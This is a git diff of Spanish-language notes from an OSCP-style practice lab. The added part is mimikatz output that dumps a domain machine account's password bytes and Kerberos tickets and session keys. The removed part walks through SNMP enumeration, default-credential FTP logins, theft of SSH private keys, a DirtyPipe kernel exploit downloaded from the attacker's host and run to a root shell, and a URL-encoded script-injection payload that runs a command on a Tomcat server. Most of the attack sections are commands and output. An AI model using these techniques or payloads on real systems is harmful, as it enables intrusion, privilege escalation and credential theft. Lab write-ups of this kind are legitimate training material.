+         * Password : 29 08 7e 13 f9 5b 95 e1 5a ea 66 93 e4 ff f7 92 63 34 cf e5 6a 27 5e 4b cc 37 0a 2b 53 41 df f7 86 82 4d c9 cb 76 29 d9 d2 6c 76 38 68 f6 7e 50 c1 df 02 d8 36 be 90 4a a0 53 cf 27 f4 a1 e1 0e 1d a4 bc 17 fc 3d 15 ff db 99 17 d4 58 cf 49 fc 42 29 1e 37 3c 1c fc 77 3e fe c1 68 0a da 8f 0d dd ae c6 f8 d5 f7 6c 65 8f 44 3a 2d d9 53 a0 e8 b3 1c bc 69 2d 0e eb 92 18 b7 e0 17 b7 e2 ea 72 94 72 b0 4c 4c c1 2c 06 bb b0 71 e8 f1 d9 56 d7 b1 66 0b a3 3c f1 25 37 4c 01 f6 27 5a c9 be 73 b7 a9 8f 68 5b a4 9d e7 eb e7 6f 33 cd 23 ac 5f d8 20 e4 af d3 e5 28 2d 5c 92 3d c4 1c b4 d7 f1 d6 05 c2 7e 0b 4b a5 4b f0 00 4e 05 ed bf c7 a3 b1 24 92 49 4d a6 6c f6 fd a1 68 1f e6 6f 80 9a f2 71 d8 c5 fc 30 f1 57 61 20 ac 38 02 31 c5 1f 
+
+        Group 0 - Ticket Granting Service
+         [00000000]
+           Start/End/MaxRenew: 8/17/2025 2:10:28 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : cifs ; DC01.oscp.exam ; @ OSCP.EXAM
+           Target Name  (02) : cifs ; DC01.oscp.exam ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             353e5620ee7a9a02d32079c4f3107dc5b0ae607c303899a7ecf758719928839c
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000001]
+           Start/End/MaxRenew: 8/17/2025 2:09:34 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : ldap ; dc01.oscp.exam ; @ OSCP.EXAM
+           Target Name  (02) : ldap ; dc01.oscp.exam ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             3c4f6d6e7e0fe91d49825e81d689dd5f5d1ab233fa86fb3920f6aa3369a642e5
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000002]
+           Start/End/MaxRenew: 8/17/2025 2:09:33 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : DNS ; dc01.oscp.exam ; @ OSCP.EXAM
+           Target Name  (02) : DNS ; dc01.oscp.exam ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             e1aea9627bf070f9ff7bcacb24512e6c20ee7f09bb82ceb1e3ef562f04527fb3
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000003]
+           Start/End/MaxRenew: 8/17/2025 2:09:31 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : ldap ; dc01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
+           Target Name  (02) : ldap ; dc01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( OSCP.EXAM )
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             035fdefee90b2e5e66e151fecced1f66e1477dfa7f761669eed1f333fc5f2ec3
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 8/17/2025 2:09:33 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
+           Target Name  (--) : @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( $$Delegation Ticket$$ )
+           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             213ffcf4b37cff43864c0d27e2fd12c34fc2a045905873d106eb196e2fa505b1
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+         [00000001]
+           Start/End/MaxRenew: 8/17/2025 2:09:31 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
+           Target Name  (02) : krbtgt ; oscp.exam ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( oscp.exam )
+           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             2298c2fcbe5a13cd88a14be7e3ce8e10287c57dea89a44abae1a9274a6c17dcd
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+
+Authentication Id : 0 ; 47630 (00000000:0000ba0e)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/12/2025 2:57:47 PM
+SID               : S-1-5-96-0-1
+
+         * Username : MS01$
+         * Domain   : oscp.exam
+         * Password : 29 08 7e 13 f9 5b 95 e1 5a ea 66 93 e4 ff f7 92 63 34 cf e5 6a 27 5e 4b cc 37 0a 2b 53 41 df f7 86 82 4d c9 cb 76 29 d9 d2 6c 76 38 68 f6 7e 50 c1 df 02 d8 36 be 90 4a a0 53 cf 27 f4 a1 e1 0e 1d a4 bc 17 fc 3d 15 ff db 99 17 d4 58 cf 49 fc 42 29 1e 37 3c 1c fc 77 3e fe c1 68 0a da 8f 0d dd ae c6 f8 d5 f7 6c 65 8f 44 3a 2d d9 53 a0 e8 b3 1c bc 69 2d 0e eb 92 18 b7 e0 17 b7 e2 ea 72 94 72 b0 4c 4c c1 2c 06 bb b0 71 e8 f1 d9 56 d7 b1 66 0b a3 3c f1 25 37 4c 01 f6 27 5a c9 be 73 b7 a9 8f 68 5b a4 9d e7 eb e7 6f 33 cd 23 ac 5f d8 20 e4 af d3 e5 28 2d 5c 92 3d c4 1c b4 d7 f1 d6 05 c2 7e 0b 4b a5 4b f0 00 4e 05 ed bf c7 a3 b1 24 92 49 4d a6 6c f6 fd a1 68 1f e6 6f 80 9a f2 71 d8 c5 fc 30 f1 57 61 20 ac 38 02 31 c5 1f 
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 47559 (00000000:0000b9c7)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/12/2025 2:57:47 PM
+SID               : S-1-5-96-0-0
+
+         * Username : MS01$
+         * Domain   : oscp.exam
+         * Password : 29 08 7e 13 f9 5b 95 e1 5a ea 66 93 e4 ff f7 92 63 34 cf e5 6a 27 5e 4b cc 37 0a 2b 53 41 df f7 86 82 4d c9 cb 76 29 d9 d2 6c 76 38 68 f6 7e 50 c1 df 02 d8 36 be 90 4a a0 53 cf 27 f4 a1 e1 0e 1d a4 bc 17 fc 3d 15 ff db 99 17 d4 58 cf 49 fc 42 29 1e 37 3c 1c fc 77 3e fe c1 68 0a da 8f 0d dd ae c6 f8 d5 f7 6c 65 8f 44 3a 2d d9 53 a0 e8 b3 1c bc 69 2d 0e eb 92 18 b7 e0 17 b7 e2 ea 72 94 72 b0 4c 4c c1 2c 06 bb b0 71 e8 f1 d9 56 d7 b1 66 0b a3 3c f1 25 37 4c 01 f6 27 5a c9 be 73 b7 a9 8f 68 5b a4 9d e7 eb e7 6f 33 cd 23 ac 5f d8 20 e4 af d3 e5 28 2d 5c 92 3d c4 1c b4 d7 f1 d6 05 c2 7e 0b 4b a5 4b f0 00 4e 05 ed bf c7 a3 b1 24 92 49 4d a6 6c f6 fd a1 68 1f e6 6f 80 9a f2 71 d8 c5 fc 30 f1 57 61 20 ac 38 02 31 c5 1f 
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : MS01$
+Domain            : OSCP
+Logon Server      : (null)
+Logon Time        : 2/12/2025 2:57:47 PM
+SID               : S-1-5-18
+
+         * Username : ms01$
+         * Domain   : OSCP.EXAM
+         * Password : 29 08 7e 13 f9 5b 95 e1 5a ea 66 93 e4 ff f7 92 63 34 cf e5 6a 27 5e 4b cc 37 0a 2b 53 41 df f7 86 82 4d c9 cb 76 29 d9 d2 6c 76 38 68 f6 7e 50 c1 df 02 d8 36 be 90 4a a0 53 cf 27 f4 a1 e1 0e 1d a4 bc 17 fc 3d 15 ff db 99 17 d4 58 cf 49 fc 42 29 1e 37 3c 1c fc 77 3e fe c1 68 0a da 8f 0d dd ae c6 f8 d5 f7 6c 65 8f 44 3a 2d d9 53 a0 e8 b3 1c bc 69 2d 0e eb 92 18 b7 e0 17 b7 e2 ea 72 94 72 b0 4c 4c c1 2c 06 bb b0 71 e8 f1 d9 56 d7 b1 66 0b a3 3c f1 25 37 4c 01 f6 27 5a c9 be 73 b7 a9 8f 68 5b a4 9d e7 eb e7 6f 33 cd 23 ac 5f d8 20 e4 af d3 e5 28 2d 5c 92 3d c4 1c b4 d7 f1 d6 05 c2 7e 0b 4b a5 4b f0 00 4e 05 ed bf c7 a3 b1 24 92 49 4d a6 6c f6 fd a1 68 1f e6 6f 80 9a f2 71 d8 c5 fc 30 f1 57 61 20 ac 38 02 31 c5 1f 
+
+        Group 0 - Ticket Granting Service
+         [00000000]
+           Start/End/MaxRenew: 8/17/2025 5:02:14 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : cifs ; dc01 ; @ OSCP.EXAM
+           Target Name  (02) : cifs ; dc01 ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             ad9e624c8555744d4484f736608f7e9e1cce7db3de8c14f5ecf38aea89e106ab
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000001]
+           Start/End/MaxRenew: 8/17/2025 4:40:32 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : ldap ; DC01.oscp.exam ; @ OSCP.EXAM
+           Target Name  (02) : ldap ; DC01.oscp.exam ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             4af120ae7fb2aebe6a72d972765e01604c6aef79f61e1619c0b8a0133e81a501
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000002]
+           Start/End/MaxRenew: 8/17/2025 2:10:32 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : cifs ; DC01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
+           Target Name  (02) : cifs ; DC01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( oscp.exam )
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             8a92bc4e9f618f0fcc8597c4d08684b408658b0b03527f401684e8a97c640824
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+         [00000003]
+           Start/End/MaxRenew: 8/17/2025 2:10:32 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (01) : MS01$ ; @ OSCP.EXAM
+           Target Name  (01) : MS01$ ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM
+           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             73fe49f1fd73d49f34a665032a33b200e520ec679074fc5b2c862c73f4dc69f8
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
+         [00000004]
+           Start/End/MaxRenew: 8/17/2025 2:09:31 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : ldap ; DC01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
+           Target Name  (02) : ldap ; DC01.oscp.exam ; oscp.exam ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( OSCP.EXAM )
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             b4d14a876b76fe1a55f61a97f35154257648664d7a6125af564c1a31df81cc94
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8        [...]
+
+        Group 1 - Client Ticket ?
+         [00000000]
+           Start/End/MaxRenew: 8/17/2025 2:49:58 PM ; 8/17/2025 3:04:58 PM ; 8/24/2025 2:09:31 PM
+           Service Name (01) : ms01$ ; @ (null)
+           Target Name  (10) : eric.wallows ; @ (null)
+           Client Name  (10) : eric.wallows ; @ oscp.exam
+           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             979ca87b07c82198cb2dfd0f6c64e3e3fdaec0827cc9a12b2bb4da0605962af7
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 8/17/2025 2:10:32 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
+           Target Name  (--) : @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( $$Delegation Ticket$$ )
+           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             7055bd9c91e7787215356e235c44fc69a83b59b90204789941caf5077ce47778
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+         [00000001]
+           Start/End/MaxRenew: 8/17/2025 2:09:31 PM ; 8/18/2025 12:09:31 AM ; 8/24/2025 2:09:31 PM
+           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
+           Target Name  (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
+           Client Name  (01) : MS01$ ; @ OSCP.EXAM ( OSCP.EXAM )
+           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             c74edf832a1c2101f1b8f84965e241be58a8ada6da51619f314346980dcd73dc
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+
+mimikatz # 
+```
+
+
 
 ## Standalone-Machines
 
@@ -1374,1049 +1821,6 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Thu Aug 14 11:22:22 2025 -- 3 IP addresses (3 hosts up) scanned in 67.40 seconds
 ```
 
-## .149 KIERO
+## .149
 
-### Enumeracion
 
-```bash
-┌──(root㉿kali)-[/home/…/5_OSCP-B/Standalone-Machines/149/snmp_192.168.193.149_loot]
-└─# snmpwalk -v2c -c public 192.168.193.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
-NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
-NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
-NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
-NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
-NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
-NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
-NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
-NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
-NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
-NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
-NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
-NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
-NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
-NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value
-```
-
-* Usuarios:
-
-```bash
-john
-kiero
-```
-* Como dice el mensaje anterior probamos credenciales por defecto del usuario **kiero**
-```bash
-kiero:kiero
-```
-* Entramos al servidor FTP
-
-```bash
-┌──(root㉿kali)-[/home/…/5_OSCP-B/Standalone-Machines/149/snmp_192.168.193.149_loot]
-└─# ftp 192.168.193.149
-Connected to 192.168.193.149.
-220 (vsFTPd 3.0.3)
-Name (192.168.193.149:kali): kiero
-331 Please specify the password.
-Password: 
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-
-ftp> ls
-229 Entering Extended Passive Mode (|||10100|)
-150 Here comes the directory listing.
--rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
--rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
--rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2
-226 Directory send OK.
-ftp> help
-Commands may be abbreviated.  Commands are:
-
-!               edit            lpage           nlist           rcvbuf          struct
-$               epsv            lpwd            nmap            recv            sunique
-account         epsv4           ls              ntrans          reget           system
-append          epsv6           macdef          open            remopts         tenex
-ascii           exit            mdelete         page            rename          throttle
-bell            features        mdir            passive         reset           trace
-binary          fget            mget            pdir            restart         type
-bye             form            mkdir           pls             rhelp           umask
-case            ftp             mls             pmlsd           rmdir           unset
-cd              gate            mlsd            preserve        rstatus         usage
-cdup            get             mlst            progress        runique         user
-chmod           glob            mode            prompt          send            verbose
-close           hash            modtime         proxy           sendport        xferbuf
-cr              help            more            put             set             ?
-debug           idle            mput            pwd             site
-delete          image           mreget          quit            size
-dir             lcd             msend           quote           sndbuf
-disconnect      less            newer           rate            status
-ftp> get id_rsa
-local: id_rsa remote: id_rsa
-229 Entering Extended Passive Mode (|||10092|)
-150 Opening BINARY mode data connection for id_rsa (2590 bytes).
-100% |*****************************************************************|  2590       29.40 MiB/s    00:00 ETA
-226 Transfer complete.
-2590 bytes received in 00:00 (12.37 KiB/s)
-ftp> get id_rsa_2
-local: id_rsa_2 remote: id_rsa_2
-229 Entering Extended Passive Mode (|||10099|)
-150 Opening BINARY mode data connection for id_rsa_2 (2635 bytes).
-100% |*****************************************************************|  2635       23.70 MiB/s    00:00 ETA
-226 Transfer complete.
-2635 bytes received in 00:00 (12.58 KiB/s)
-ftp> get id_rsa.pub
-local: id_rsa.pub remote: id_rsa.pub
-229 Entering Extended Passive Mode (|||10092|)
-150 Opening BINARY mode data connection for id_rsa.pub (563 bytes).
-100% |*****************************************************************|   563        6.97 MiB/s    00:00 ETA
-226 Transfer complete.
-563 bytes received in 00:00 (2.68 KiB/s)
-ftp> 
-```
-
-* Nos conectamos por ssh.
-
-> Revisamos id_rsa.pub y encontramos a **john**
-
-* Nos conectamos con id_rsa:
-
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/149]
-└─# ssh -i id_rsa john@192.168.193.149 
-Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
-john@oscp:~$ ls
-RESET_PASSWD  local.txt
-john@oscp:~$ cat local.txt
-9efc78cf2b59a9438d28fae78b4297e0
-
-john@oscp:~$ uname -a
-Linux oscp 5.9.0-050900-generic #202010112230 SMP Sun Oct 11 22:34:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
-john@oscp:~$ cat /etc/os-release
-NAME="Ubuntu"
-VERSION="20.04.5 LTS (Focal Fossa)"
-ID=ubuntu
-ID_LIKE=debian
-PRETTY_NAME="Ubuntu 20.04.5 LTS"
-VERSION_ID="20.04"
-HOME_URL="https://www.ubuntu.com/"
-SUPPORT_URL="https://help.ubuntu.com/"
-BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
-PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
-VERSION_CODENAME=focal
-UBUNTU_CODENAME=focal
-john@oscp:~$ cat /etc/issue
-Ubuntu 20.04.5 LTS \n \l
-
-john@oscp:~$ arch
-x86_64
-
-```
-> Debido a este error
-
-```bash
-john@oscp:~$ ./pspy64 
-./pspy64: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./pspy64)
-./pspy64: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./pspy64)
-```
-
-Seguimos las instrucciones de este [repo](https://github.com/X0RW3LL/XenSpawn)
-
-#### Escalamos privilegios con dirtypipe
-
-
-1. Buscamos y hacemos un mirror del exploit en el contenedor para compilarlo dentro de este
-```bash
-┌──(root㉿kali)-[/var/lib/machines/Kiero/root]
-└─# searchsploit "dirty"                 
-------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                     |  Path
-------------------------------------------------------------------- ---------------------------------
-Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page | linux/dos/43199.c
-Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page | linux/dos/44305.c
-Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' R | linux/local/40616.c
-Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condit | linux/local/40847.cpp
-Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condi | linux/local/40838.c
-Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Con | linux/local/40839.c
-Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condit | linux/local/40611.c
-Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe | linux/local/50808.c
-Qualcomm Android - Kernel Use-After-Free via Incorrect set_page_di | android/dos/46941.txt
-Quick and Dirty Blog (qdblog) 0.4 - 'categories.php' Local File In | php/webapps/4603.txt
-Quick and Dirty Blog (qdblog) 0.4 - SQL Injection / Local File Inc | php/webapps/3729.txt
-snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1 | linux/local/46361.py
-snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2 | linux/local/46362.py
-------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-                                                                                                     
-┌──(root㉿kali)-[/var/lib/machines/Kiero/root]
-└─# searchsploit -m 50808
-  Exploit: Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
-      URL: https://www.exploit-db.com/exploits/50808
-     Path: /usr/share/exploitdb/exploits/linux/local/50808.c
-    Codes: CVE-2022-0847
- Verified: False
-File Type: C source, ASCII text
-Copied to: /var/lib/machines/Kiero/root/50808.c
-
-┌──(root㉿kali)-[/var/lib/machines/Kiero/root]
-└─# systemd-nspawn -M Kiero
-░ Spawning container Kiero on /var/lib/machines/Kiero.
-░ Press Ctrl-] three times within 1s to kill container.
-root@Kiero:~# gcc -pthread 50808.c -o dirty -lcrypt
-root@Kiero:~# ll
-total 56
-drwx------  2 root root  4096 Aug 23 18:50 ./
-drwxr-xr-x 23 root root  4096 Aug 23 18:38 ../
--rw-r--r--  1 root root    18 Aug 23 18:29 .bash_aliases
--rw-------  1 root root   221 Aug 23 18:47 .bash_history
--rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
--rw-r--r--  1 root root   148 Aug 17  2015 .profile
--rw-r--r--  1 root root  7297 Aug 23 18:48 50808.c
--rwxr-xr-x  1 root root 14184 Aug 23 18:50 dirty*
--rw-r--r--  1 root root  4371 Aug 23 18:45 exploit.c
-root@Kiero:~# exit
-logout
-Container Kiero exited successfully.
-```
-
-2. Explotamos 
-
-```bash
-john@oscp:~$ wget http://192.168.45.152:8000/dirty
---2025-08-23 22:05:03--  http://192.168.45.152:8000/dirty
-Connecting to 192.168.45.152:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 14184 (14K) [application/octet-stream]
-Saving to: ‘dirty’
-
-dirty                                                100%[====================================================================================================================>]  13.85K  80.7KB/s    in 0.2s    
-
-2025-08-23 22:05:04 (80.7 KB/s) - ‘dirty’ saved [14184/14184]
-
-john@oscp:~$ chmod +x dirty
-
-john@oscp:~$ find / -perm -4000 2>/dev/null
-/home/john/RESET_PASSWD
-/usr/bin/mount
-/usr/bin/chsh
-/usr/bin/passwd
-/usr/bin/newgrp
-/usr/bin/fusermount
-/usr/bin/pkexec
-/usr/bin/gpasswd
-/usr/bin/umount
-/usr/bin/su
-/usr/bin/chfn
-/usr/bin/at
-/usr/bin/sudo
-
-john@oscp:~$ ./dirty /usr/bin/su
-[+] hijacking suid binary..
-[+] dropping suid shell..
-[+] restoring suid binary..
-[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
-# whoami
-root
-# cd /root
-# ls
-proof.txt  snap
-# cat proof.txt
-04e8ca871e390b36557157d57ff2776d
-# 
-```
-
-## .150 BERLIN
-
-#### Enumeracion
-
-* **Nmap**
-
-```bash
-# Nmap 7.95 scan initiated Thu Aug 14 15:36:54 2025 as: /usr/lib/nmap/nmap -A -sS -oN 150-nmap.txt 192.168.116.150
-Nmap scan report for 192.168.116.150
-Host is up (0.16s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
-|_  256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
-8080/tcp open  http    Apache Tomcat (language: en)
-|_http-open-proxy: Proxy might be redirecting requests
-|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
-|_http-favicon: Spring Java Framework
-Device type: general purpose|router
-Running: Linux 5.X, MikroTik RouterOS 7.X
-OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
-OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
-Network Distance: 4 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 80/tcp)
-HOP RTT       ADDRESS
-1   229.41 ms 192.168.45.1
-2   229.37 ms 192.168.45.254
-3   229.44 ms 192.168.251.1
-4   229.50 ms 192.168.116.150
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-```
-
-* **Gobuster**
-
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
-└─# gobuster dir -u http://192.168.249.150:8080 -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.249.150:8080
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/?:                   (Status: 200) [Size: 19]
-/error                (Status: 500) [Size: 105]
-/pixels[]             (Status: 400) [Size: 800]
-/search               (Status: 200) [Size: 25]
-/error                (Status: 500) [Size: 105]
-/favicon.ico          (Status: 200) [Size: 946]
-/search               (Status: 200) [Size: 25]
-Progress: 12334 / 12335 (99.99%)
-===============================================================                                                                                                                                                   
-Finished                                                                                                                                                                                                          
-=============================================================== 
-```
-
-* **Exploit (PoC) ping to kali**
-
-```bash
-http://192.168.249.150:8080/search/?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27ping%20-c%201%20192.168.45.152%27%29%7D
-```
-
-* **Monitoreo**
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
-└─# tcpdump -i tun0 icmp
-tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
-listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
-01:57:13.177937 IP 192.168.249.150 > 192.168.45.152: ICMP echo request, id 1, seq 1, length 64
